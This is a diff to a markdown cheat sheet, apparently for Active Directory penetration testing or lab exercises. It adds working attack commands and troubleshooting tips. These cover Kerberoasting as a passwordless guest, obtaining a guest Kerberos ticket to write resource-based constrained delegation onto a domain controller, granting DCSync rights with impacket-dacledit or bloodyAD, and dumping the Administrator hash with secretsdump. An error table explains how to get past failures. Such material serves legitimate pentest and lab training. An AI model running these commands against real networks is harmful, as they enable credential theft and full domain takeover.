@@ -34,9 +34,14 @@ guest with an empty password is still a valid foothold — route around it:
 ```
 # read/enumerate as guest → use Impacket / nxc instead
 impacket-GetUserSPNs {{DOMAIN}}/guest -no-pass -dc-ip {{DC}} -request
-# GenericWrite RBCD write as guest → Impacket twin (accepts -no-pass):
-impacket-rbcd -delegate-to 'DC$' -delegate-from {{SPN_USER}} -action write \
-  -no-pass -dc-ip {{DC}} {{DOMAIN}}/guest
+
+# GenericWrite RBCD write as guest — NTLM -no-pass is REJECTED
+# ("NTLM needs domain\username and a password"). Go through Kerberos:
+impacket-getTGT -no-pass {{DOMAIN}}/guest -dc-ip {{DC}}      # -> guest.ccache
+export KRB5CCNAME=$PWD/guest.ccache
+impacket-rbcd -delegate-to 'AD$' -delegate-from {{SPN_USER}} -action write \
+  -k -no-pass {{DOMAIN}}/guest -dc-ip {{DC}}
+# note: computer accounts end in $ -> quote it ('AD$'), or the DN lookup fails
 # after you crack a real cred / get a ccache, bloodyAD works normally (or -k)
 ```
 
@@ -58,6 +63,22 @@ bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add rbcd 'AD$' {{
 bloodyAD --host {{DC_FQDN}} --dc-ip {{DC}} -d {{DOMAIN}} -k add dcsync {{USER}}
 # then: impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}} -just-dc-user Administrator
 ```
+
+**bloodyAD not on the box?** `impacket-dacledit` is the co-equal fallback — but
+three things bite (all seen live):
+
+```
+export KRB5CCNAME=$PWD/Administrator@ldap_{{DC_FQDN}}@{{DOMAIN}}.ccache
+export KRB5_CONFIG=/tmp/krb5.conf     # a minimal realm->kdc map avoids resolver surprises
+impacket-dacledit -action write -rights DCSync -principal {{USER}} \
+  -target-dn 'DC=...' -k -no-pass -dc-host {{DC_FQDN}} {{DOMAIN}}/Administrator
+```
+
+- `-rights` is **case-sensitive**: `DCSync`, not `DCSYNC` (argparse rejects it).
+- Use **`-dc-host {{DC_FQDN}}`**, not `-dc-ip`. With `-dc-ip`, Impacket hunts for a
+  `ldap/<IP>` ticket, finds none (yours is `ldap/{{DC_FQDN}}`), and falls back to
+  a passwordless TGT → `KDC_ERR_PREAUTH_FAILED`. The `-dc-host` must match the S4U SPN.
+- Confirm the ccache first if unsure: principal `Administrator@{{DOMAIN}}`, server `ldap/{{DC_FQDN}}`.
 
 `dacledit.py` is the Impacket twin when bloodyAD is missing:
 
@@ -91,6 +112,8 @@ dacledit.py -action write -rights DCSync -principal {{USER}} \
 | insufficient access | you misread BH — confirm the security principal (group vs user) |
 | LDAPS required | `--secure` / `ldaps://` |
 | `provide a -p 'password'` (empty pw) | guest path — use Impacket `-no-pass` / `rbcd`, or crack a cred first |
+| rbcd `NTLM needs domain\username and a password` | empty-pw guest can't NTLM — `getTGT -no-pass` then `rbcd -k -no-pass` |
+| rbcd/write `User not found in LDAP` on a computer | quote the `$`: `'AD$'` not `AD` |
 | GenericWrite on computer, no MAQ | RBCD principal can be an existing SPN user, not only `FAKE$` |
 | constraint violation on password | policy. Try a longer lab password |
 | AddMember to DA denied | you have AddMember on a **nested** group. add there, not DA |
